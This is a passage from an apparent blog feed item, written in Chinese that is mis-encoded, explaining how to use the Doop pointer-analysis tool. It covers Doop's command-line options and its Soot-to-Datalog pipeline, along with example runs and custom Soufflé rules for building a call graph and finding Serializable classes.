class="string">&#x27;fulljars&#x27;</span> (a custom</span><br><span class="line">                                                          Android build), or <span class="string">&#x27;apks&#x27;</span> (custom Dalvik equivalent). Default: java_8. Valid values: java_3, java_4, java_5, java_6, java_7, java_7_debug, java_8,</span><br><span class="line">                                                          java_8_debug, java_8_mini, java_9, java_10, java_11, java_12, java_13, java_14, java_15, java_16, android_22_fulljars, android_25_fulljars, android_2_stubs,</span><br><span class="line">                                                          android_3_stubs, android_4_stubs, android_5_stubs, android_6_stubs, android_7_stubs, android_8_stubs, android_9_stubs, android_10_stubs, android_11_stubs,</span><br><span class="line">                                                          android_12_stubs, android_13_stubs, android_14_stubs, android_15_stubs, android_16_stubs, android_17_stubs, android_18_stubs, android_19_stubs,</span><br><span class="line">                                                          android_20_stubs, android_21_stubs, android_22_stubs, android_23_stubs, android_24_stubs, android_25_stubs, android_26_stubs, android_27_stubs,</span><br><span class="line">                                                          android_28_stubs, android_29_stubs, android_25_apks, android_26_robolectric, python_2</span><br><span class="line">-t,--<span class="built_in">timeout</span> &lt;TIMEOUT&gt;                                    The analysis execution <span class="built_in">timeout</span> <span class="keyword">in</span> minutes (default: 90 minutes).</span><br><span class="line">-v,--version                                              Display version and <span class="built_in">exit</span>.</span><br></pre></td></tr></table></figure><p>æ•°æ®æµåˆ†æç›¸å…³é€‰é¡¹ï¼Œæ²¡æœ‰ç”¨è¿‡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--data-flow-goto-lib                                   Allow data-flow logic to go into library code using CHA.</span><br><span class="line">--data-flow-only-lib                                   Run data-flow logic only <span class="keyword">for</span> library code.</span><br></pre></td></tr></table></figure><p>é’ˆå¯¹ souffle å¼•æ“çš„é€‰é¡¹ï¼Œå¯ä»¥ç”¨ <code>--souffle-jobs</code> æŒ‡å®šæ›´å¤šçš„å¹¶è¡Œç©ºé—´ï¼Œå‰ææ˜¯åˆ†æèƒ½å¤Ÿæœ‰è¿™ä¹ˆå¤šå¹¶è¡Œï¼Œå¦åˆ™ä¹Ÿä¸ä¼šè¾¾åˆ°æŒ‡å®šçš„æ•°é‡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--souffle-jobs &lt;NUMBER&gt;                                Specify number of Souffle <span class="built_in">jobs</span> to run (default: 4).</span><br></pre></td></tr></table></figure><p>åˆ†æçš„å…¥å£ç‚¹é€‰æ‹©ï¼Œæ²¡æœ‰ç”¨è¿‡ï¼Œè²Œä¼¼ä¸æŒ‡å®šå¯»æ‰¾ main ç±»å°±è§¦å‘ open-program åˆ†æã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--discover-main-methods                                Discover main() methods.</span><br><span class="line">--discover-tests                                       Discover and treat <span class="built_in">test</span> code (e.g. JUnit) as entry points.</span><br><span class="line">--exclude-implicitly-reachable-code                    Don<span class="string">&#x27;t make any method implicitly reachable.</span></span><br><span class="line"><span class="string">--ignore-main-method                                   If main class is not given explicitly, do not try to discover it from jar/filename info. Open-program analysis variant may be triggered in this case.</span></span><br><span class="line"><span class="string">--main &lt;MAIN&gt;                                          Specify the main class(es) separated by spaces.</span></span><br></pre></td></tr></table></figure><p>å…³äºäº‹å®çš„ç”Ÿæˆï¼ŒDoop ä¸­çš„äº‹å®æ˜¯åŸºäº Soot çš„åˆ†æç”Ÿæˆã€‚<code>--fact-gen-cores</code> å¯ä»¥ç”¨æ¥å¢åŠ å¹¶è¡Œåº¦ï¼ŒåŒæ ·ï¼Œåˆ†æè¾¾ä¸åˆ°è¿™ä¹ˆå¤šå¹¶è¡Œé‚£ä¹Ÿä¸ä¼šè¾¾åˆ°æŒ‡å®šæ•°é‡ï¼›<code>--facts-only</code> åªç”Ÿæˆäº‹å®ï¼›<code>--generate-jimple</code> ç”Ÿæˆäº‹å®å’Œ Jimple&#x2F;Shimple æ–‡ä»¶ï¼›<code>--wala-fact-gen</code> é€‰ç”¨ WALA ç”Ÿæˆäº‹å®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--also-resolve &lt;CLASS&gt;                                 Force resolution of class(es) by Soot.</span><br><span class="line">--cache                                                The analysis will use the cached facts, <span class="keyword">if</span> they exist.</span><br><span class="line">--dont-cache-facts                                     Don<span class="string">&#x27;t cache generated facts.</span></span><br><span class="line"><span class="string">--extract-more-strings                                 Extract more string constants from the input code (may degrade analysis performance).</span></span><br><span class="line"><span class="string">--fact-gen-cores &lt;NUMBER&gt;                              Number of cores to use for parallel fact generation.</span></span><br><span class="line"><span class="string">--facts-only                                           Only generate facts and exit.</span></span><br><span class="line"><span class="string">--generate-jimple                                      Generate Jimple/Shimple files along with .facts files.</span></span><br><span class="line"><span class="string">--input-id &lt;ID&gt;                                        Import facts from dir with id ID and start the analysis. Application/library inputs are ignored.</span></span><br><span class="line"><span class="string">--report-phantoms                                      Report phantom methods/types during fact generation.</span></span><br><span class="line"><span class="string">--thorough-fact-gen                                    Attempt to resolve as many classes during fact generation (may take more time).</span></span><br><span class="line"><span class="string">--unique-facts                                         Eliminate redundancy from .facts files.</span></span><br><span class="line"><span class="string">--wala-fact-gen                                        Use WALA to generate the facts.</span></span><br><span class="line"><span class="string">--Xfacts-subset &lt;SUBSET&gt;                               Produce facts only for a subset of the given classes. Valid values: PLATFORM, APP, APP_N_DEPS</span></span><br><span class="line"><span class="string">--Xignore-factgen-errors                               Continue with analysis despite fact generation errors.</span></span><br><span class="line"><span class="string">--Xsymlink-input-facts                                 Use symbolic links instead of copying cached facts. Used with --cache or --input-id.</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰æŒ‡å®šå…¥å£æˆ–æ²¡æœ‰æ‰¾åˆ° mainï¼Œå°†é»˜è®¤å¯ç”¨ <code>--open-programs xxx</code> å¯»æ‰¾åˆ†æçš„å…¥å£ç‚¹ï¼›å…¶ä»–ä¸¤ä¸ªé€‰é¡¹æ²¡ç”¨è¿‡ï¼Œä¹Ÿæ²¡è¯´æ˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--open-programs &lt;STRATEGY&gt;                             Create analysis entry points and environment using various strategies (such as <span class="string">&#x27;concrete-types&#x27;</span> or <span class="string">&#x27;jackee&#x27;</span>).</span><br><span class="line">--open-programs-context-insensitive-entrypoints</span><br><span class="line">--open-programs-heap-context-insensitive-entrypoints</span><br></pre></td></tr></table></figure><p>æ”¯æŒåˆ†æåå°„çš„ä¸€äº›é€‰é¡¹ï¼Œå¼„ä¸æ¸…æ¯ä¸ªé€‰é¡¹éƒ½åŒ…å«ä»€ä¹ˆåˆ†æçš„æƒ…å†µä¸‹ï¼Œä¸€å¾‹å»ºè®®ä½¿ç”¨ <code>--reflection-classic</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--distinguish-reflection-only-string-constants         Merge all string constants except those useful <span class="keyword">for</span> reflection.</span><br><span class="line">--distinguish-string-buffers-per-package               Merges string buffer objects only on a per-package basis (default behavior <span class="keyword">for</span> reflection-classic).</span><br><span class="line">--light-reflection-glue                                Handle some shallow reflection patterns without full reflection support.</span><br><span class="line">--reflection                                           Enable logic <span class="keyword">for</span> handling Java reflection.</span><br><span class="line">--reflection-classic                                   Enable (classic subset of) logic <span class="keyword">for</span> handling Java reflection.</span><br><span class="line">--reflection-dynamic-proxies                           Enable handling of the Java dynamic proxy API.</span><br><span class="line">--reflection-high-soundness-mode                       Enable extra rules <span class="keyword">for</span> more sound handling of reflection.</span><br><span class="line">--reflection-invent-unknown-objects</span><br><span class="line">--reflection-method-handles                            Reflection-based handling of the method handle APIs.</span><br><span class="line">--reflection-refined-objects</span><br><span class="line">--reflection-speculative-use-based-analysis</span><br><span class="line">--reflection-substring-analysis                        Allows reasoning on what substrings may yield reflection objects.</span><br><span class="line">--tamiflex &lt;FILE&gt;                                      Use file with tamiflex data <span class="keyword">for</span> reflection.</span><br></pre></td></tr></table></figure><p><code>--stats none</code> å¯ä»¥ç”¨äºå…³é—­ç»Ÿè®¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--stats &lt;LEVEL&gt;                                        Set statistics collection logic. Valid values: none, default, full</span><br></pre></td></tr></table></figure><p>å½¢å¦‚ <code>--X...</code> çš„é€‰é¡¹æ˜¯å®éªŒæ€§é€‰é¡¹ï¼Œä¸ä¸€å®šæ”¯æŒæ‰€æœ‰åˆ†æã€‚è¿™äº›å‚æ•°å¯èƒ½æ˜¯ä¸€æ¡ commit å¢åŠ çš„å°åŠŸèƒ½ï¼Œä¸å»ºè®®ä½¿ç”¨ï¼Œå› ä¸ºè¿™äº›å‚æ•°æœ¬èº«å°±åªç”¨äºç‰¹å®šåˆ†æã€‚</p><h2 id="åˆ†æé€»è¾‘"><a href="#åˆ†æé€»è¾‘" class="headerlink" title="åˆ†æé€»è¾‘"></a>åˆ†æé€»è¾‘</h2><p>Doop æ‰§è¡Œæµç¨‹å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰æ­¥ï¼š</p><ol><li>ä½¿ç”¨ soot ç”Ÿæˆ jimple æ–‡ä»¶<ul><li>ä½¿ç”¨ <code>--generate-jimple</code> å‚æ•°å¯ä»¥è¾“å‡º jimple æ–‡ä»¶ï¼Œåœ¨ <code>output/&lt;ID&gt;/database/jimple</code> æ–‡ä»¶å¤¹ä¸‹</li></ul></li><li>å°† jimple æ–‡ä»¶è½¬æ¢ä¸º datalog å¼•æ“çš„è¾“å…¥äº‹å®ï¼ˆ.factsï¼‰</li><li>ä½¿ç”¨ souffle å¼•æ“æ‰§è¡Œé€‰å®šçš„åˆ†æï¼Œå°†å…³ç³»è¾“å‡ºä¸º .csvï¼Œå³åˆ†æç»“æœ</li></ol><p>Doop åˆ†æå­—èŠ‚ç ï¼ˆæˆ– Android çš„ Dex ä»£ç ï¼‰ï¼Œä¸¤è€…éƒ½è¢«è½¬æ¢ä¸ºåä¸º Jimple çš„ä¸­é—´è¡¨ç¤ºï¼ˆIntermediate Representation, IRï¼‰ï¼Œå®é™…åˆ†æçš„å°±æ˜¯ jimpleï¼›å› ä¸ºå­—èŠ‚ç æ˜¯åŸºäºå †æ ˆçš„ï¼Œä½†æŒ‡é’ˆåˆ†æä¸­éœ€è¦å˜é‡&#x2F;å±€éƒ¨å˜é‡æ¥åˆ†ææŒ‡å‘ï¼Œæ‰€ä»¥ä½¿ç”¨ Soot å°†åŸºäºå †æ ˆçš„å­—èŠ‚ç è½¬æ¢ä¸ºå…·æœ‰å±€éƒ¨å˜é‡çš„ä¸­é—´è¡¨ç¤ºã€‚ä¸‹ä¸€æ­¥å°† Jimple ä¸­é—´è¡¨ç¤ºè½¬æ¢ä¸º .facts æ–‡ä»¶ï¼ˆæ•°æ®åº“è¡¨ï¼‰ï¼Œç„¶åç”± Datalog é€»è¾‘åŠ è½½è¿™äº›æ–‡ä»¶ä½œä¸ºè¾“å…¥ã€‚Datalog ä»è¾“å…¥å¼€å§‹æ¨å¯¼äº‹å®ï¼Œå¡«å……å…³ç³»ï¼›ä¸€äº›å…³ç³»ä½¿ç”¨ <code>.output</code> æ ‡è®°è¾“å‡ºï¼Œä¿å­˜ä¸º .csv æ–‡ä»¶ï¼›å½“ Datalog æ‰§è¡Œç»ˆæ­¢æ—¶ï¼Œä¿å­˜çš„ .csv æ–‡ä»¶å°±æ˜¯åˆ†æè¾“å‡ºã€‚</p><p><img src="https://s2.loli.net/2021/12/17/NP1SnQWBdwMAzJu.jpg"></p><h2 id="æ‰§è¡Œç»“æœ"><a href="#æ‰§è¡Œç»“æœ" class="headerlink" title="æ‰§è¡Œç»“æœ"></a>æ‰§è¡Œç»“æœ</h2><p>ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œä¿å­˜ä¸º Main.java å¹¶ç”Ÿæˆ test.jar åŒ…ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        list.add(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>-i</code> æŒ‡å®šåˆ†æçš„ jar åŒ…ï¼›<code>-a context-insensitive</code> ä½¿ç”¨ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿåˆ†æï¼›<code>--stats none</code> å…³é—­ç»Ÿè®¡ä¿¡æ¯ï¼›<code>--generate-jinple</code> ç”Ÿæˆ Shimple&#x2F;Jimple æ–‡ä»¶ï¼›<code>--fact-gen-cores 32 --souffle-jobs 32</code> æœ€å¤§å¹¶è¡Œä»»åŠ¡æ•°é‡ï¼›<code>--id test</code> æŒ‡å®šè¾“å‡ºæ–‡ä»¶å¤¹ testã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è€—æ—¶ 4m 24s</span></span><br><span class="line">./doop -i test.jar -a context-insensitive --stats none --generate-jimple --fact-gen-cores 32 --souffle-jobs 32 --<span class="built_in">id</span> <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>åˆ†æå®Œæ¯•åï¼Œ<code>./doop/last-analysis/</code> å°†é“¾æ¥åˆ°æœ€æ–°çš„åˆ†æç»“æœï¼Œå³ <code>./doop/out/test/database</code>ï¼Œæ¯æ¬¡åˆ†æéƒ½å°†åœ¨ out ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª <ID> ç›®å½•ï¼ŒåŒ…å«è¾“å‡ºçš„æ•°æ®åº“ï¼ˆdatabaseï¼‰ã€è§„åˆ™æ–‡ä»¶ï¼ˆ<code>xxxanalysis.dl</code>ã€<code>gen_*.dl</code>ï¼‰ã€å…ƒæ•°æ®æ–‡ä»¶ï¼ˆmetaï¼‰ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯èƒ½æ˜¯å› ä¸ºæ²¡æœ‰å¯ç”¨ <code>--discover-main-methods</code> é€‰é¡¹ï¼Œæ‰€ä»¥è­¦å‘Šæ²¡æ‰¾åˆ° main ç±»ï¼Œå¹¶é»˜è®¤è§¦å‘ <code>--open-programs xxx</code>ï¼Œå¯ä»¥æ˜¾å¼å…³é—­ <code>--open-programs disabled</code>ã€‚ä½¿ç”¨çš„é…ç½®å¯ä»¥åœ¨å…ƒæ•°æ®æ–‡ä»¶ä¸­æŸ¥çœ‹ï¼Œè¿™é‡Œç”¨çš„æ˜¯ <code>jackee</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -e &quot;OPEN&quot; out/test/meta</span><br></pre></td></tr></table></figure><p>å¦‚æœæŒ‡å®šç”Ÿæˆ Jimple&#x2F;Shimple æ–‡ä»¶ï¼Œé‚£ä¹ˆ database æ–‡ä»¶å¤¹ä¸‹ä¼šå¤šå‡ºä¸€ä¸ª jimple æ–‡ä»¶å¤¹ï¼›souffle åˆ†æä½¿ç”¨çš„æ˜¯ <code>gen_*.dl</code> æ–‡ä»¶ï¼Œå¯ä»¥ç”¨äºæŸ¥çœ‹å‘½åç©ºé—´ã€‚</p><p>database æ–‡ä»¶å¤¹ä¸­åŒ…å« .facts äº‹å®æ–‡ä»¶ï¼Œä»¥åŠè¾“å‡º .csvï¼Œè¾“å‡ºæ˜¯åœ¨ dl è§„åˆ™æ–‡ä»¶ä¸­æŒ‡å®šï¼Œå¯ä»¥ç¼–å†™è‡ªå®šä¹‰çš„è§„åˆ™æ–‡ä»¶å¹¶ä½¿ç”¨ <code>--extra-logic myrules.dl</code> åˆå¹¶åˆ†æã€‚</p><p>äº‹å®å’Œè¾“å‡ºçš„å†…å®¹æ ¼å¼å¯ä»¥åœ¨ doop&#x2F;souffle-logic&#x2F; ç›®å½•ä¸‹æœç´¢ï¼Œæˆ–ç›´æ¥æŸ¥çœ‹ <code>gen_*.dl</code> æ–‡ä»¶ï¼Œå…¶ä¸­ <code>?</code> å¼€å¤´è¡¨ç¤ºå˜é‡åï¼ˆä¸€ç§çº¦å®šï¼Œæ²¡æœ‰ä¸ºä»€ä¹ˆï¼‰ã€‚</p><p>ä»¥ <code>AnyCallGraphEdge</code> ä¸ºä¾‹ï¼Œå£°æ˜åŒ…å«è°ƒç”¨è¯­å¥ã€æ–¹æ³•ä¸¤ä¸ªå‚æ•°ï¼Œå®šä¹‰ä¸ºå…¶ä»–è°ƒç”¨è¾¹çš„å¹¶é›†ï¼Œæœ€åç”¨ <code>.output</code> è¾“å‡ºåˆ° csv æ–‡ä»¶ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">AnyCallGraphEdge</span>(?instr:<span class="symbol">Instruction</span>, ?method:<span class="symbol">Method</span>)</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">CallGraphEdge</span>(<span class="symbol">_</span>, ?i, <span class="symbol">_</span>, ?m).</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">InvokedynamicBootCallGraphEdge</span>(<span class="symbol">_</span>, ?i, <span class="symbol">_</span>, ?m).</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">LambdaCallGraphEdge</span>(<span class="symbol">_</span>, ?i, <span class="symbol">_</span>, ?m, <span class="symbol">_</span>).</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">MethodHandleCallGraphEdge</span>(<span class="symbol">_</span>, ?i, <span class="symbol">_</span>, ?m, <span class="symbol">_</span>, <span class="symbol">_</span>).</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">OpaqueCallGraphEdge</span>(?i, ?m).</span><br><span class="line">.output <span class="symbol">AnyCallGraphEdge</span>(<span class="symbol">IO</span>=<span class="string">&quot;file&quot;</span>,filename=<span class="string">&quot;AnyCallGraphEdge.csv&quot;</span>,delimiter=<span class="string">&quot;\t&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/17/AZk5M4dHwImoqbf.jpg"></p><h2 id="æ„é€ è°ƒç”¨å›¾"><a href="#æ„é€ è°ƒç”¨å›¾" class="headerlink" title="æ„é€ è°ƒç”¨å›¾"></a>æ„é€ è°ƒç”¨å›¾</h2><p>é‚£ä¹ˆèƒ½ä¸èƒ½ç›´æ¥ç”¨è°ƒç”¨è¾¹ <code>AnyCallGraphEdge</code> æ„é€ è°ƒç”¨å›¾å‘¢ï¼Œç­”æ¡ˆæ˜¯<strong>ä¸è¡Œ</strong>ï¼Œå› ä¸ºæ˜¯è¯­å¥æŒ‡å‘æ–¹æ³•ï¼Œè€Œä¸æ˜¯æ–¹æ³•æŒ‡å‘æ–¹æ³•ã€‚å› æ­¤ï¼Œè¿™é‡Œå°±å¯ä»¥è¯•ä¸€è¯•è‡ªå®šä¹‰è§„åˆ™äº†~</p><p>é¦–å…ˆæ‰¾åˆ°è¯­å¥æ‰€åŒ…å«çš„æ–¹æ³•è°ƒç”¨ï¼Œç”¨å…³ç³» <code>Instruction_Method</code> å°±å¯ä»¥å®šä½ï¼Œç„¶åå°†äºŒè€…è¿›è¡ŒåŒ¹é…è¿æ¥ï¼Œæœ€åè¾“å‡º <code>æ–¹æ³• -&gt; æ–¹æ³•</code> ä½œä¸ºè°ƒç”¨å›¾ã€‚è¿™é‡Œçš„ <code>Method</code> æ˜¯ Doop å®šä¹‰çš„ç±»å‹ï¼Œè¡¨ç¤ºæ–¹æ³•ï¼ˆå®é™…ä¸Šå°±æ˜¯å­—ç¬¦ä¸² <code>.type Method = symbol</code>ï¼‰ï¼Œè€Œå˜é‡ <code>?invocation</code> è¡¨ç¤ºæŒ‡ä»¤è¯­å¥ï¼ˆå®é™…ä¸Šä¹Ÿæ˜¯å­—ç¬¦ä¸² <code>.type Instruction = symbol</code>ï¼‰ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">CG</span>(?caller:<span class="symbol">Method</span>, ?callee:<span class="symbol">Method</span>)</span><br><span class="line"></span><br><span class="line"><span class="symbol">CG</span>(?caller, ?callee) :-</span><br><span class="line">  mainAnalysis.<span class="symbol">AnyCallGraphEdge</span>(?invocation, ?callee),</span><br><span class="line">  <span class="symbol">Instruction_Method</span>(?invocation, ?caller).</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">CG</span></span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°è§„åˆ™ä¿å­˜åˆ° myrules.dl æ–‡ä»¶ä¸­ï¼Œé‡æ–°æ‰§è¡Œåˆ†æï¼Œ<code>--extra-logic myrules.dl</code> è¡¨ç¤ºæ·»åŠ è‡ªå®šä¹‰çš„è§„åˆ™ã€‚ç»æµ‹è¯•ï¼Œé»˜è®¤ <code>--open-programs jackee</code> ç”Ÿæˆçš„è°ƒç”¨å›¾ä¸­æ— æ³•æ‰¾åˆ° Main ç±»ç›¸å…³çš„è°ƒç”¨ï¼Œä½¿ç”¨ <code>--open-programs concrete-types</code> å³å¯ï¼Œä½†åˆ†æè€—æ—¶å¢åŠ ã€‚</p><ul><li>jackee å®é™…ä¸Šæ˜¯å¯¹ JavaEE çš„åˆ†æï¼Œå› æ­¤å»ºè®®é»˜è®¤ä½¿ç”¨ concrete-typesï¼Œç›¸å…³è®ºæ–‡ï¼š<a href="https://yanniss.github.io/enterprise-pldi20.pdf">Static Analysis of Java Enterprise Applications: Frameworks and Caches, the Elephants in the Room</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è€—æ—¶ 6m 2s</span></span><br><span class="line">./doop -i test.jar -a context-insensitive --stats none --generate-jimple --fact-gen-cores 32 --souffle-jobs 32 --open-programs concrete-types --extra-logic myrules.dl --<span class="built_in">id</span> cg</span><br></pre></td></tr></table></figure><p>æœ€åå¯ä»¥åœ¨è°ƒç”¨å›¾ä¸­æŸ¥æ‰¾ Main ç±»ç›¸å…³çš„è°ƒç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -e <span class="string">&quot;Main:&quot;</span> out/cg/database/CG.csv</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/17/JEmRyi6DUYV3o7v.jpg"></p><h2 id="æŸ¥æ‰¾å…³ç³»"><a href="#æŸ¥æ‰¾å…³ç³»" class="headerlink" title="æŸ¥æ‰¾å…³ç³»"></a>æŸ¥æ‰¾å…³ç³»</h2><p>å£°æ˜äº†ä¸€ä¸ªåä¸º <code>IsSerializable</code> çš„å…³ç³»ï¼Œå®šä¹‰ä¸º <code>java.io.Serializable</code> çš„å­ç±»ï¼Œè¾“å‡ºç»“æœå°†ä¼šæ˜¯å¯åºåˆ—åŒ–ç±»ã€‚</p><ul><li><code>basic.SubtypeOf</code> è¡¨ç¤º basic å‘½åç©ºé—´ï¼ˆç»„ä»¶ï¼‰ä¸‹çš„ SubtypeOf å…³ç³»ï¼ŒåŒ…å«ç±»ä¹‹é—´çš„ç»§æ‰¿å…³ç³»</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">IsSerializable</span>(?class:<span class="symbol">Type</span>)</span><br><span class="line"></span><br><span class="line"><span class="symbol">IsSerializable</span>(?subtype) :-</span><br><span class="line">  basic.<span class="symbol">SubtypeOf</span>(?subtype, ?type),</span><br><span class="line">  ?type = <span class="string">&quot;java.io.Serializable&quot;</span>.</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">IsSerializable</span></span><br></pre></td></tr></table></figure><p>ä¿å­˜åˆ° myrules.dl ä¸­ï¼Œæ‰§è¡ŒåŒæ ·çš„åˆ†æã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è€—æ—¶ 5m59s</span></span><br><span class="line">./doop -i test.jar -a context-insensitive --stats none --generate-jimple --fact-gen-cores 32 --souffle-jobs 32 --open-programs concrete-types --extra-logic myrules.dl --<span class="built_in">id</span> ser</span><br></pre></td></tr></table></figure><p>èƒ½å¤Ÿå¾—åˆ°é¢„æœŸçš„ç»“æœï¼š</p><p><img src="https://s2.loli.net/2021/12/17/8wLlpkeA1FMhdQq.jpg"></p><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>æ‹–äº†ä¸€ä¸ªæœˆç»ˆäºå†™äº†ç‚¹ä¸œè¥¿ï¼ˆæ‘Šæ‰‹ï¼‰ï¼Œå®é™…ä¸Šå¯¹ Doop è§„åˆ™çš„ç†è§£å…¨é é˜…è¯» doop&#x2F;souffle-logic ä¸­çš„ datalog ä»¥åŠåœ¨ Discord é¢‘é“é‡Œè¿›è¡Œæé—®ï¼Œè‡³å°‘ç°åœ¨èƒ½å¤Ÿçœ‹æ‡‚å¤§éƒ¨åˆ†è§„åˆ™ï¼Œä¹Ÿèƒ½å¤Ÿæ ¹æ®éœ€æ±‚å†™ä¸€å†™ç®€å•çš„è§„åˆ™äº†ã€‚</p><p>åˆ†ææ¯”è¾ƒè€—æ—¶å’Œä¸ç›´è§‚ï¼Œæ®è¯´æ˜¯æœ€å…ˆè¿›çš„æŒ‡é’ˆåˆ†æå·¥å…·ï¼Œä½†ä¸Šæ‰‹å®åœ¨æ˜¯å›°éš¾ã€‚</p><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><p>åŸºæœ¬å°±æ˜¯æ ¹æ®å·¥å…·æœ¬èº«å’Œç›¸å…³è®ºæ–‡æ‘¸ç´¢å‡ºæ¥çš„ã€‚</p><ul><li><a href="https://bitbucket.org/yanniss/doop/src/master/">Yannis Smaragdakis&#x2F;Untitled project&#x2F;doop</a></li><li><a href="https://bitbucket.org/yanniss/doop/src/master/docs/doop-101.md">Doop 101</a></li><li><a href="https://github.com/souffle-lang/souffle">souffle-lang&#x2F;souffle</a></li><li><a href="https://souffle-lang.github.io/">SoufflÃ© | SoufflÃ© â€¢ A Datalog Synthesis Tool for Static Analysis</a></li><li><a href="http://plast-lab.github.io/">PLaST research group</a></li><li><a href="https://discord.gg/4q7rj5s">Doop Discord Channel</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Security/">Security</category>
      
      
      <category domain="https://jckling.github.io/tags/Datalog/">Datalog</category>
      
      <category domain="https://jckling.github.io/tags/Java/">Java</category>
      
      
      <comments>https://jckling.github.io/2021/12/17/Security/%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%20Doop%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Datalog å¼•æ“ SoufflÃ© æŒ‡å—</title>
      <link>https://jckling.github.io/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/</link>
